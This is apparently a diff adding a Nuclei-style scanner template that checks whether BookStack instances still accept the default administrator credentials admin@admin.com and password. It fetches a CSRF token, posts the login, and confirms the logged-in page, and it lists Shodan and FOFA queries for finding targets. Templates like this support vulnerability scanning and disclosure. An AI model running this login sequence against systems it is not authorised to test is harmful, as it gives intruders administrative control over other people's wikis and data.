@@ -1,0 +1,82 @@
+id: bookstack-default-login
+
+info:
+  name: BookStack - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    BookStack contains a default login caused by the install migration creating the administrator account admin@admin.com with the password password and only recommending a change after the first login, letting remote attackers sign in as administrator and control all books, pages, users and settings.
+  reference:
+    - https://www.bookstackapp.com/docs/admin/installation/
+    - https://github.com/BookStackApp/BookStack
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: bookstackapp
+    product: bookstack
+    shodan-query: http.html:"BookStack"
+    fofa-query: body="BookStack" || title="bookstack"
+  tags: bookstack,default-login
+
+variables:
+  username: "admin@admin.com"
+  password: "password"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'contains_all(body, "name=\"_token\"", "name=\"email\"", "name=\"password\"")'
+          - 'contains(header, "bookstack_session")'
+          - 'status_code == 200'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        group: 1
+        regex:
+          - 'name="_token"\s+value="([^"]+)"'
+        internal: true
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _token={{csrf}}&email={{url_encode(username)}}&password={{url_encode(password)}}
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - '!contains(location, "/login")'
+          - 'status_code == 302'
+        condition: and
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "class=\"user-name", "/logout\"")'
+          - 'contains(content_type, "text/html")'
+          - 'status_code == 200'
+        condition: and
